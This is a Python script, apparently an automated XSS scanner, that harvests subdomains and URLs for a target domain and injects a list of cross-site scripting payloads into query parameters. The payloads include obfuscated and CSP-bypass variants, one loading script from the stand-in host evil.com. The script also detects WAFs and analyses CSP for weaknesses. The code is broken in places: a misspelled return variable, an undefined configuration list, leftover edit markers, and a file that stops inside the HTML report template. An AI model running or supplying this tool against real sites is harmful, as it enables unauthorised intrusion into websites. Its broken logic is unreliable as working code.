#!/usr/bin/env python3
# Ultimate XSS Scanner Pro v8.0 (AI-Optimized with Advanced Detection)
# Educational Use Only - By Pradeep Kumar (Enhanced by AI)

import subprocess
import os
import sys
import time
import json
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, quote, unquote
import argparse
import shutil
import requests
from bs4 import BeautifulSoup
import random
import string
import re
import signal
from fake_useragent import UserAgent
import warnings
from bs4 import XMLParsedAsHTMLWarning
import hashlib
import html
import zlib
import base64
import re  # Add this if not already present
import html  # Add this if not already present
import xml.etree.ElementTree as ET
from collections import Counter

# Suppress warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Enhanced color output
class colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

class Logger:
    @staticmethod
    def info(msg):
        print(f"{colors.BLUE}[*] {msg}{colors.RESET}")
    
    @staticmethod
    def success(msg):
        print(f"{colors.GREEN}[+] {msg}{colors.RESET}")
    
    @staticmethod
    def warning(msg):
        print(f"{colors.YELLOW}[!] {msg}{colors.RESET}")
    
    @staticmethod
    def error(msg):
        print(f"{colors.RED}[-] {msg}{colors.RESET}")
    
    @staticmethod
    def critical(msg):
        print(f"{colors.RED}{colors.BOLD}[CRITICAL] {msg}{colors.RESET}")

# AI-Optimized Configuration
class Config:
    TIMEOUT = 25
    MAX_THREADS = 20
    USER_AGENT = UserAgent().random
    HEADERS = {'User-Agent': USER_AGENT}
    
    # Enhanced Smart Payloads with Context Awareness
    SMART_PAYLOADS = [
        # Basic XSS
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        
        # Advanced Context-Aware
        'javascript:alert`1`',
        '<svg/onload=alert(1)>',
        '${alert(1)}',
        
        # DOM-Based
        '#<img src=x onerror=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        
        # Polyglot
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(alert(1))//',
        
        # Obfuscated
        '<script>\\u0061lert(1)</script>',
        '<img src=x oneonerrorrror=alert(1)>',
        
        # Special Cases
        '<xss id=x tabindex=1 onfocus=alert(1)></xss>',
        
        # CSP Bypass Payloads
        '<script src="data:text/javascript,alert(1)"></script>',
        '<script src=//evil.com/xss.js></script>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        
        # Advanced Obfuscation
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src="x:gif" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
        
        # HTML5 Entities
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        
        # JSON XSS
        '{"test":"</script><script>alert(1)</script>"}',
        
        # Template Injection
        '{{7*7}}',
        '<%= 7*7 %>'
    ]
    
    BLACKLIST = "jpg,jpeg,gif,png,css,js,svg,woff,ttf,eot,pdf,ico"
    
    PROXY = None
    RATE_LIMIT_DELAY = 0.7
    SKIP_EXTENSIONS = [
        '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.doc', '.docx',
        '.xls', '.xlsx', '.ppt', '.pptx', '.swf', '.woff', '.woff2',
        '.ttf', '.eot', '.svg', '.ico', '.mp3', '.mp4', '.avi', '.css',
        '.js', '.json', '.xml', '.csv', '.txt', '.zip', '.rar', '.tar',
        '.gz', '.7z', '.exe', '.msi', '.dmg', '.pkg'
    ]
    
    # Add these new patterns for false positive reduction
    RESOURCE_PATTERNS = [
        r'WebResource\.axd',
        r'ScriptResource\.axd',
        r'\.js(\?|$)',
        r'\.css(\?|$)',
        r'\.axd\?d=',
        r'\.ashx\?'
    ]
    
    STATIC_EXTENSIONS = ['.axd', '.ashx', '.asmx', '.svc']
    
    STATIC_CONTENT_TYPES = [
        'application/javascript',
        'text/css',
        'application/x-font-',
        'image/',
        'application/octet-stream'
    ]
    
    # CSP Keywords
    CSP_KEYWORDS = [
        'content-security-policy', 'x-content-security-policy',
        'x-webkit-csp', 'report-uri', 'default-src', 'script-src',
        'style-src', 'img-src', 'connect-src', 'font-src',
        'object-src', 'media-src', 'frame-src', 'sandbox',
        'report-to', 'require-sri-for', 'base-uri', 'child-src',
        'form-action', 'frame-ancestors', 'plugin-types', 'referrer',
        'reflected-xss', 'disown-opener', 'upgrade-insecure-requests'
    ]
    
    MANUAL_ENDPOINTS = [
        "/api", "/admin", "/test", "/v1", "/v2",
        "/graphql", "/swagger", "/console", "/wp-admin",
        "/login", "/register", "/api-docs", "/rest",
        "/soap", "/xmlrpc", "/oauth", "/auth"
    ]
    
    SUBDOMAIN_TOOLS = [
        "subfinder -d {domain} -silent -timeout 30",
        "assetfinder --subs-only {domain}",
        "amass enum -passive -d {domain} -timeout 30 -silent",
        "findomain -t {domain} -q || echo 'findomain not installed'"
    ]

def generate_smart_payload(context):
    """AI-Generated Context-Aware Payloads with Enhanced Variants"""
    if 'script' in context:
        return random.choice([
            '</script><script>alert(1)</script>',
            '"+alert(1)+"',
            '`${alert(1)}`',
            '<!--</script><script>alert(1)//-->',
            '\\";alert(1);//'
        ])
    elif 'attribute' in context:
        return random.choice([
            '" onmouseover=alert(1) x="',
            ' autofocus onfocus=alert(1) x=',
            'javascript:alert(1)',
            ' onload=alert(1) ',
            'x="`${alert(1)}`"'
        ])
    elif 'json' in context:
        return random.choice([
            '{"test":"</script><script>alert(1)</script>"}',
            '"]},\\"test\\":\\"<script>alert(1)</script>"}',
            '\\"}};alert(1);//'
        ])
    elif 'xml' in context:
        return random.choice([
            '<![CDATA[<script>alert(1)</script>]]>',
            '<test>&lt;script&gt;alert(1)&lt;/script&gt;</test>',
            '<?xml version="1.0"?><script>alert(1)</script>'
        ])
    else:
        return random.choice(Config.SMART_PAYLOADS)

def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def is_scan_candidate(url):
    """AI-Enhanced URL Filtering with More Precise Checks"""
    url_lower = url.lower()
    
    # Skip static files
    if any(url_lower.endswith(ext) for ext in Config.SKIP_EXTENSIONS):
        return False
        
    parsed = urlparse(url)
    
    # Check for parameters or dynamic extensions
    if parsed.query:
        return True
        
    # Check for common dynamic extensions
    dynamic_exts = ['.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.html']
    if any(ext in parsed.path for ext in dynamic_exts):
        return True
        
    # AI-Heuristic: Check for potential API endpoints
    api_keywords = ['api', 'rest', 'json', 'xml', 'ajax', 'graphql', 'soap']
    if any(kw in parsed.path for kw in api_keywords):
        return True
        
    # Check for common vulnerable paths
    vulnerable_paths = ['search', 'query', 'filter', 'redirect', 'url', 'page']
    if any(vp in parsed.path for vp in vulnerable_paths):
        return True
        
    return False

def create_directory_structure(base_dir):
    dirs = [
        'subdomains',
        'urls',
        'params',
        'js',
        'scans/xss',
        'scans/waf',
        'reports',
        'js/downloaded',
        'screenshots',
        'logs',
        'csp'
    ]
    
    for d in dirs:
        path = os.path.join(base_dir, d)
        os.makedirs(path, exist_ok=True)
        Logger.success(f"Created directory: {path}")

def check_and_install_tools():
    required_tools = {
        'subfinder': 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
        'gau': 'go install github.com/lc/gau/v2/cmd/gau@latest',
        'dalfox': 'go install github.com/hahwul/dalfox/v2@latest',
        'httpx': 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
        'waybackurls': 'go install github.com/tomnomnom/waybackurls@latest',
        'katana': 'go install github.com/projectdiscovery/katana/cmd/katana@latest',
        'assetfinder': 'go install github.com/tomnomnom/assetfinder@latest',
        'nuclei': 'go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest'
    }
    
    missing_tools = []
    for tool, install_cmd in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append((tool, install_cmd))
    
    if missing_tools:
        Logger.warning(f"Missing {len(missing_tools)} required tools!")
        for tool, install_cmd in missing_tools:
            Logger.error(f"{tool} not found in PATH")
        
        choice = input(f"{colors.YELLOW}[?] Install missing tools? (y/n): {colors.RESET}").lower()
        if choice == 'y':
            for tool, install_cmd in missing_tools:
                try:
                    Logger.info(f"Installing {tool}...")
                    subprocess.run(install_cmd, shell=True, check=True)
                    Logger.success(f"Installed {tool}")
                except Exception as e:
                    Logger.error(f"Failed to install {tool}: {e}")
        else:
            Logger.critical("Required tools missing. Exiting.")
            sys.exit(1)

def enumerate_subdomains(domain):
    """
    Enhanced subdomain enumeration with improved validation and fallbacks
    Returns: sorted list of unique subdomains (always includes base domain)
    """
    Logger.info(f"Starting subdomain enumeration for {domain}")
    
    # Tools configuration with improved fallbacks
    TOOLS = [
        {
            "name": "subfinder",
            "cmd": "subfinder -d {domain} -silent -timeout 30",
            "fallback": "echo {domain}"  # Basic fallback
        },
        {
            "name": "assetfinder", 
            "cmd": "assetfinder --subs-only {domain}",
            "fallback": "echo {domain} | assetfinder 2>/dev/null || echo ''"
        },
        {
            "name": "amass",
            "cmd": "amass enum -passive -d {domain} -timeout 30 -silent",
            "fallback": None
        },
        {
            "name": "findomain",
            "cmd": "findomain -t {domain} -q 2>/dev/null || echo ''",
            "fallback": None
        }
    ]
    
    subdomains = set()
    failures = 0
    
    for tool in TOOLS:
        tool_name = tool["name"]
        try:
            # Try primary command
            command = tool["cmd"].format(domain=domain)
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300
            )
            
            # If failed but has fallback, try that
            if result.returncode != 0 and tool["fallback"]:
                command = tool["fallback"].format(domain=domain)
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=120
                )
            
            # Process results
            if result.returncode == 0:
                new_subs = {
                    s.strip().lower() 
                    for s in result.stdout.splitlines() 
                    if s.strip() and 
                    (domain.lower() in s.lower() or s.lower() == domain.lower())
                }
                if new_subs:
                    subdomains.update(new_subs)
                    Logger.success(f"{tool_name} found {len(new_subs)} subdomains")
            else:
                failures += 1
                
        except subprocess.TimeoutExpired:
            Logger.warning(f"{tool_name} timed out")
            failures += 1
        except Exception as e:
            Logger.error(f"{tool_name} error: {str(e)}")
            failures += 1
    
    # Add manual endpoints from Config
    for endpoint in Config.MANUAL_ENDPOINTS:
        subdomains.add(f"http://{domain}{endpoint}")
        subdomains.add(f"https://{domain}{endpoint}")
    
    # Always include base domain
    subdomains.add(domain.lower())
    
    # Final validation
    valid_subs = sorted({
        sub for sub in subdomains 
        if (sub.endswith(f".{domain}") or sub == domain) 
        and not sub.startswith(('*','.'))
    })
    
    Logger.success(
        f"Found {len(valid_subs)} valid subdomains "
        f"({failures} tool failures)"
    )
    return valid_subs

def collect_urls(subdomain):
    """Enhanced URL collection with better error handling"""
    Logger.info(f"Collecting URLs for {subdomain}")
    
    # Define tools with proper error handling
    TOOLS = [
        {
            "name": "gau",
            "cmd": f"gau {subdomain} --subs --timeout 20 --blacklist {Config.BLACKLIST}",
            "fallback": None
        },
        {
            "name": "waybackurls", 
            "cmd": f"waybackurls {subdomain}",
            "fallback": None
        },
        {
            "name": "katana",
            "cmd": f"katana -u {subdomain} -silent -jc -kf all -d 3 -f qurl -timeout 20",
            "fallback": None
        },
        {
            "name": "gospider",
            "cmd": f"gospider -s https://{subdomain} -d 2 -t 5 -c 5 -q --blacklist {Config.BLACKLIST}",
            "fallback": None
        }
    ]
    
    urls = set()
    failures = 0
    
    for tool in TOOLS:
        try:
            result = subprocess.run(
                tool["cmd"],
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                new_urls = {
                    u.strip() for u in result.stdout.splitlines() 
                    if u.strip() and is_valid_url(u)
                }
                urls.update(new_urls)
                Logger.success(f"{tool['name']} collected {len(new_urls)} URLs")
            else:
                Logger.warning(f"{tool['name']} failed: {result.stderr.strip()}")
                failures += 1
        except Exception as e:
            Logger.error(f"{tool['name']} error: {str(e)}")
            failures += 1
    
    # Add manual endpoints as fallback
    for endpoint in Config.MANUAL_ENDPOINTS:
        urls.add(f"http://{subdomain}{endpoint}")
        urls.add(f"https://{subdomain}{endpoint}")
    
    # Filter valid and interesting URLs
    interesting_urls = sorted({
        url for url in urls 
        if is_scan_candidate(url) and is_valid_url(url)
    })
    
    Logger.success(
        f"Found {len(interesting_urls)} interesting URLs "
        f"({failures} tool failures)"
    )
    return interesting_urlsls
def detect_context(response):
    """AI-Based Context Detection with Enhanced Analysis"""
    content_type = response.headers.get('Content-Type', '').lower()
    
    # Detect JSON responses
    if 'application/json' in content_type:
        try:
            json.loads(response.text)
            return 'json'
        except:
            pass
    
    # Detect XML responses
    if 'application/xml' in content_type or 'text/xml' in content_type:
        try:
            ET.fromstring(response.text)
            return 'xml'
        except:
            pass
    
    # Detect HTML responses
    if 'text/html' in content_type:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Detect script contexts
        scripts = soup.find_all('script')
        if scripts:
            for script in scripts:
                if script.string and 'document.write' in script.string:
                    return 'script_write'
                elif script.string and 'innerHTML' in script.string:
                    return 'script_innerHTML'
            return 'script'
        
        # Detect attribute contexts
        inputs = soup.find_all('input')
        if inputs:
            return 'attribute'
        
        # Detect form contexts
        forms = soup.find_all('form')
        if forms:
            return 'form'
        
        # Detect URL contexts
        links = soup.find_all('a', href=True)
        if links:
            for link in links:
                if 'javascript:' in link['href']:
                    return 'url_javascript'
                elif 'data:' in link['href']:
                    return 'url_data'
            return 'url'
    
    return 'default'

def detect_csp(response):
    """Detect Content Security Policy Headers"""
    csp_headers = []
    csp_policies = {}
    
    for header in response.headers:
        if 'content-security-policy' in header.lower():
            csp_headers.append(header)
            policy = response.headers[header]
            csp_policies[header] = policy
            
            # Parse CSP directives
            directives = {}
            for directive in policy.split(';'):
                directive = directive.strip()
                if ' ' in directive:
                    key, value = directive.split(' ', 1)
                    directives[key.lower()] = value.split()
            
            csp_policies[header + '_parsed'] = directives
    
    return csp_policies if csp_headers else None

def analyze_csp_bypass(csp_policies):
    """Analyze CSP for Potential Bypasses"""
    bypass_techniques = []
    
    for header, policy in csp_policies.items():
        if '_parsed' in header:
            continue
            
        parsed = csp_policies.get(header + '_parsed', {})
        
        # Check for unsafe-eval in script-src
        if 'script-src' in parsed and "'unsafe-eval'" in parsed['script-src']:
            bypass_techniques.append({
                'type': 'CSP Bypass - unsafe-eval allowed',
                'directive': 'script-src',
                'vulnerability': 'Allows eval() which can execute injected code',
                'severity': 'high'
            })
        
        # Check for unsafe-inline in script-src
        if 'script-src' in parsed and "'unsafe-inline'" in parsed['script-src']:
            bypass_techniques.append({
                'type': 'CSP Bypass - unsafe-inline allowed',
                'directive': 'script-src',
                'vulnerability': 'Allows inline scripts which can execute injected code',
                'severity': 'high'
            })
        
        # Check for wildcard in script-src
        if 'script-src' in parsed and '*' in parsed['script-src']:
            bypass_techniques.append({
                'type': 'CSP Bypass - wildcard allowed',
                'directive': 'script-src',
                'vulnerability': 'Allows scripts from any domain',
                'severity': 'critical'
            })
        
        # Check for missing object-src or script-src
        if 'object-src' not in parsed:
            bypass_techniques.append({
                'type': 'CSP Bypass - missing object-src',
                'directive': 'object-src',
                'vulnerability': 'Allows dangerous objects like Flash or PDF',
                'severity': 'medium'
            })
        
        # Check for data: URI allowed
        if 'script-src' in parsed and 'data:' in parsed['script-src']:
            bypass_techniques.append({
                'type': 'CSP Bypass - data: URI allowed',
                'directive': 'script-src',
                'vulnerability': 'Allows scripts from data URIs',
                'severity': 'high'
            })
    
    return bypass_techniques if bypass_techniques else None

def is_false_positive(response, payload, url):
    """Enhanced False Positive Detection with Resource File Handling"""
    # Skip known resource files
    if any(url.lower().endswith(ext) for ext in Config.STATIC_EXTENSIONS):
        return True
    
    # Check for static resource patterns in URL
    if any(re.search(pattern, url, re.I) for pattern in Config.RESOURCE_PATTERNS):
        return True
    
    # Check for security keywords in response
    response_text = response.text.lower()
    for keyword in Config.FALSE_POSITIVE_KEYWORDS:
        if keyword in response_text:
            return True
    
    # Check if payload is reflected but encoded
    encoded_payload = html.escape(payload)
    if encoded_payload in response_text and payload not in response_text:
        return True
    
    # Check for WAF blocks
    if response.status_code in [403, 406, 418, 429]:
        return True
    
    # Check for generic error pages
    error_keywords = ['error', 'blocked', 'forbidden', 'not allowed', 'access denied']
    if any(keyword in response_text for keyword in error_keywords):
        return True
    
    # Check if the response is a redirect to an error page
    if 300 <= response.status_code < 400:
        location = response.headers.get('Location', '').lower()
        if 'error' in location or 'blocked' in location:
            return True
    
    # Check for common static file content types
    content_type = response.headers.get('Content-Type', '').lower()
    if any(ct in content_type for ct in Config.STATIC_CONTENT_TYPES):
        return True
    
    # Check for ASP.NET resource files
    if 'x-aspnet-version' in response.headers:
        return True
    
    return False

def scan_xss(url):
    """AI-Powered XSS Scanning with Enhanced Detection"""
    Logger.info(f"Scanning: {url}")
    
    results = {
        'url': url,
        'vulnerabilities': [],
        'payloads_used': [],
        'techniques_tried': 0,
        'waf_detected': False,
        'csp_detected': False,
        'csp_bypasses': [],
        'skipped': None
    }

    # Skip known resource files early
    if any(url.lower().endswith(ext) for ext in Config.STATIC_EXTENSIONS):
        results['skipped'] = "Resource file (skipped)"
        return results

    if not is_scan_candidate(url):
        results['skipped'] = "Static file or no parameters"
        return results

    time.sleep(Config.RATE_LIMIT_DELAY)

    # Initial request for context analysis
    try:
        response = requests.get(
            url,
            headers=Config.HEADERS,
            timeout=Config.TIMEOUT,
            proxies=Config.PROXY,
            verify=False,
            allow_redirects=False
        )
        
        # Skip if this is a resource file
        if 'x-aspnet-version' in response.headers:
            results['skipped'] = "ASP.NET resource file"
            return results
            
        # WAF Detection
        waf_indicators = ['cloudflare', 'akamai', 'imperva', 'barracuda', 'incapsula', 'f5', 'fortinet']
        server_header = response.headers.get('Server', '').lower()
        if any(waf in server_header for waf in waf_indicators):
            results['waf_detected'] = True
            Logger.warning(f"WAF detected on {url}")
        
        # CSP Detection
        csp = detect_csp(response)
        if csp:
            results['csp_detected'] = True
            results['csp_details'] = csp
            Logger.info(f"CSP detected on {url}")
            
            # Analyze CSP for bypasses
            bypasses = analyze_csp_bypass(csp)
            if bypasses:
                results['csp_bypasses'] = bypasses
                for bypass in bypasses:
                    Logger.success(f"Potential CSP bypass found: {bypass['type']}")
        
        context = detect_context(response)
    except Exception as e:
        Logger.error(f"Error initializing scan for {url}: {str(e)}")
        return results

    # Enhanced Parameter Analysis
    parsed = urlparse(url)
    if parsed.query:
        params = dict(pair.split('=') for pair in parsed.query.split('&') if '=' in pair)
        for param in params:
            try:
                # Generate context-aware payload
                payload = generate_smart_payload(context)
                test_url = url.replace(f"{param}={params[param]}", f"{param}={payload}")
                results['payloads_used'].append(payload)
                
                test_response = requests.get(
                    test_url,
                    headers=Config.HEADERS,
                    timeout=Config.TIMEOUT,
                    proxies=Config.PROXY,
                    verify=False,
                    allow_redirects=False
                )
                
                # =============================================
                # THIS IS WHERE THE NEW CODE GOES - START
                # =============================================
                # Enhanced Detection Logic
                vulnerability_found = False
                
                # First check if it's not a false positive
                if not is_false_positive(test_response, payload, test_url):
                    # Check for direct reflection
                    if payload in test_response.text:
                        vulnerability_found = True
                        confidence = 'high'
                    # Check for partial reflection
                    elif any(fragment in test_response.text for fragment in payload.split()[:2]):
                        vulnerability_found = True
                        confidence = 'medium'
                    # Check for DOM-based patterns
                    elif any(sink in test_response.text for sink in ['document.write', 'innerHTML', 'eval(']):
                        vulnerability_found = True
                        confidence = 'medium'
                # =============================================
                # THIS IS WHERE THE NEW CODE GOES - END
                # =============================================
                
                if vulnerability_found:
                    results['vulnerabilities'].append({
                        'type': 'Reflected XSS',
                        'payload': payload,
                        'param': param,
                        'evidence': f"Payload reflected in response",
                        'confidence': confidence,
                        'scanner': 'AI-Enhanced',
                        'reproduction': test_url,
                        'context': context
                    })
                
                results['techniques_tried'] += 1
                time.sleep(Config.RATE_LIMIT_DELAY)
            except Exception as e:
                Logger.error(f"Error testing {url}: {str(e)}")
                continue

    # DOM XSS Detection with Enhanced Analysis
    try:
        dom_response = requests.get(
            url,
            headers=Config.HEADERS,
            timeout=Config.TIMEOUT,
            proxies=Config.PROXY,
            verify=False,
            allow_redirects=False
        )
        
        soup = BeautifulSoup(dom_response.text, 'html.parser')
        
        # Enhanced Dangerous Sinks
        dangerous_sinks = [
            'document.write', 'innerHTML', 'outerHTML', 'eval', 'setTimeout',
            'setInterval', 'Function', 'execScript', 'location', 'location.href',
            'location.assign', 'location.replace', 'window.open', 'postMessage',
            'jQuery.globalEval', '$.globalEval', 'script.src', 'script.text',
            'script.textContent', 'script.innerText', 'createContextualFragment',
            'range.createContextualFragment', 'document.domain'
        ]
        
        # Analyze scripts
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                script_text = script.string.lower()
                for sink in dangerous_sinks:
                    if sink in script_text:
                        # Check if the sink is using user-controlled data
                        if 'location.hash' in script_text or 'document.URL' in script_text or \
                           'document.documentURI' in script_text or 'document.baseURI' in script_text or \
                           'window.name' in script_text:
                            results['vulnerabilities'].append({
                                'type': 'DOM-based XSS',
                                'evidence': f'Found dangerous JS sink: {sink} using user-controlled data',
                                'location': 'Inline script',
                                'confidence': 'high',
                                'scanner': 'AI-DOM-Analysis'
                            })
                        else:
                            results['vulnerabilities'].append({
                                'type': 'Potential DOM XSS',
                                'evidence': f'Found dangerous JS sink: {sink}',
                                'location': 'Inline script',
                                'confidence': 'medium',
                                'scanner': 'AI-DOM-Analysis'
                            })
                        break
        
        # Analyze event handlers
        event_handlers = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeypress',
            'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout',
            'onmouseup', 'onreset', 'onselect', 'onunload', 'onabort',
            'ondragdrop', 'onmove', 'onresize', 'onscroll', 'oncontextmenu'
        ]
        
        for tag in soup.find_all():
            for attr in tag.attrs:
                if attr.lower() in event_handlers:
                    results['vulnerabilities'].append({
                        'type': 'Potential DOM XSS',
                        'evidence': f'Found event handler: {attr}',
                        'location': f'{tag.name} tag',
                        'confidence': 'medium',
                        'scanner': 'AI-DOM-Analysis'
                    })
        
        results['techniques_tried'] += 1
    except Exception as e:
        Logger.error(f"Error analyzing DOM for {url}: {str(e)}")
    
    # Filter results to remove duplicates and low confidence findings
    unique_vulns = []
    seen = set()
    
    for vuln in results['vulnerabilities']:
        key = (vuln['type'], vuln.get('param', ''), vuln.get('evidence', ''))
        if key not in seen and vuln.get('confidence', 'low') in ['high', 'medium']:
            seen.add(key)
            unique_vulns.append(vuln)
    
    results['vulnerabilities'] = unique_vulns
    
    return results

def generate_report(results, domain):
    """AI-Enhanced Reporting with Advanced Analytics"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_dir = os.path.join(domain, "reports")
    os.makedirs(report_dir, exist_ok=True)
    
    # JSON Report
    json_report_file = os.path.join(report_dir, f"xss_report_{domain}_{timestamp}.json")
    with open(json_report_file, 'w') as f:
        json.dump(results, f, indent=4)
    
    # HTML Report
    html_report_file = os.path.join(report_dir, f"xss_report_{domain}_{timestamp}.html")
    generate_html_report(results, domain, html_report_file)
    
    Logger.success(f"Reports generated: {json_report_file}, {html_report_file}")
    
    # Calculate statistics
    total_vulns = sum(len(res.get('vulnerabilities', [])) for res in results)
    vulnerable_urls = sum(1 for res in results if res.get('vulnerabilities', []))
    unique_payloads = set()
    vulnerability_types = Counter()
    
    for res in results:
        for vuln in res.get('vulnerabilities', []):
            if vuln.get('payload'):
                unique_payloads.add(vuln['payload'])
            vulnerability_types[vuln.get('type', 'Unknown')] += 1
    
    print(f"\n{colors.BOLD}{colors.CYAN}=== Scan Summary ==={colors.RESET}")
    print(f"{colors.BOLD}Target Domain:{colors.RESET} {domain}")
    print(f"{colors.BOLD}Total URLs Scanned:{colors.RESET} {len(results)}")
    print(f"{colors.BOLD}Vulnerable URLs:{colors.RESET} {vulnerable_urls}")
    print(f"{colors.BOLD}Total Vulnerabilities Found:{colors.RESET} {total_vulns}")
    print(f"{colors.BOLD}Unique Payloads Used:{colors.RESET} {len(unique_payloads)}")
    print(f"{colors.BOLD}WAF Detected:{colors.RESET} {any(res.get('waf_detected', False) for res in results)}")
    print(f"{colors.BOLD}CSP Detected:{colors.RESET} {any(res.get('csp_detected', False) for res in results)}")
    
    if vulnerability_types:
        print(f"\n{colors.BOLD}{colors.CYAN}=== Vulnerability Breakdown ==={colors.RESET}")
        for vuln_type, count in vulnerability_types.most_common():
            print(f"{vuln_type}: {count}")
    
    if total_vulns > 0:
        print(f"\n{colors.BOLD}{colors.RED}=== Critical Findings ==={colors.RESET}")
        for res in results:
            if res.get('vulnerabilities'):
                for vuln in res['vulnerabilities']:
                    if vuln.get('confidence') == 'high':
                        print(f"\n{colors.BOLD}URL:{colors.RESET} {res.get('url', 'N/A')}")
                        print(f"  {colors.YELLOW}Type:{colors.RESET} {vuln.get('type', 'N/A')}")
                        print(f"  {colors.YELLOW}Scanner:{colors.RESET} {vuln.get('scanner', 'Unknown')}")
                        print(f"  {colors.YELLOW}Confidence:{colors.RESET} {vuln.get('confidence', 'medium')}")
                        print(f"  {colors.YELLOW}Payload:{colors.RESET} {vuln.get('payload', 'N/A')}")
                        print(f"  {colors.YELLOW}Reproduce:{colors.RESET} {vuln.get('reproduction', 'N/A')}")
                        print("  " + "-"*50)

def generate_html_report(results, domain, output_file):
    """Generate Interactive HTML Report"""
    template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Scan Report for {domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        .summary {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 15px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #3498db; }}
        .hidden {{ display: none; }}
        .toggle {{ cursor: pointer; color: #3498db; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        pre {{ background: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }}
        .tab {{ overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; }}
        .tab button {{ background-color: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 10px 16px; transition: 0.3s; }}
        .tab button:hover {{ background-color: #ddd; }}
        .tab button.active {{ background-color: #ccc; }}
        .tabcontent {{ display: none; padding: 6px 12px; border: 1px solid #ccc; border-top: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XSS Scan Report for {domain}</h1>
        <p>Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        
        <div class="summary">
            <h2>Scan Summary</h2>
            <div id="summary-stats"></div>
        </div>
        
        <div class="tab">
            <button class="tablinks active" onclick="openTab(event, 'findings')">Findings</button>
            <button class="tablinks" onclick="openTab(event, 'payloads')">Payloads</button>
            <button class="tablinks" onclick="openTab(event, 'stats')">Statistics</button>
        </div>
        
        <div id="findings" class="tabcontent" style="display: block;">
            <h2>Vulnerability Findings</h2>
            <div id="vulnerabilities-container"></div>
        </div>
        
        <div id="payloads" class="tabcontent">
            <h2>Payloads Used</h2>
            <div id="payloads-container"></div>
        </div>
        
        <div id="stats" class="tabcontent">
            <h2>Scan Statistics</h2>
            <div id="stats-container"></div>
        </div>
    </div>

    <script>
        // Data from the scan
        const scanData = {json.dumps(results)};
        
        // Calculate statistics
        function calculateStats() {{
            let totalUrls = scanData.length;
            let vulnerableUrls = 0;
            let totalVulns = 0;
            let uniquePayloads = new Set();
            let vulnTypes = {{}};
            let wafDetected = false;
            let cspDetected = false;
            
            scanData.forEach(result => {{
                if (result.vulnerabilities && result.vulnerabilities.length > 0) {{
                    vulnerableUrls++;
                    totalVulns += result.vulnerabilities.length;
                    
                    result.vulnerabilities.forEach(vuln => {{
                        if (vuln.payload) uniquePayloads.add(vuln.payload);
                        vulnTypes[vuln.type] = (vulnTypes[vuln.type] || 0) + 1;
                    }});
                }}
                
                if (result.waf_detected) wafDetected = true;
                if (result.csp_detected) cspDetected = true;
            }});
            
            return {{
                totalUrls,
                vulnerableUrls,
                totalVulns,
                uniquePayloads: uniquePayloads.size,
                vulnTypes,
                wafDetected,
                cspDetected
            }};
        }}
        
        // Render summary
        function renderSummary() {{
            const stats = calculateStats();
            const summaryDiv = document.getElementById('summary-stats');
            
            let html = `
                <p><strong>Target Domain:</strong> {domain}</p>
                <p><strong>Total URLs Scanned:</strong> ${{stats.totalUrls}}</p>
                <p><strong>Vulnerable URLs:</strong> ${{stats.vulnerableUrls}}</p>
                <p><strong>Total Vulnerabilities Found:</strong> ${{stats.totalVulns}}</p>
                <p><strong>Unique Payloads Used:</strong> ${{stats.uniquePayloads}}</p>
                <p><strong>WAF Detected:</strong> ${{stats.wafDetected ? 'Yes' : 'No'}}</p>
                <p><strong>CSP Detected:</strong> ${{stats.cspDetected ? 'Yes' : 'No'}}</p>
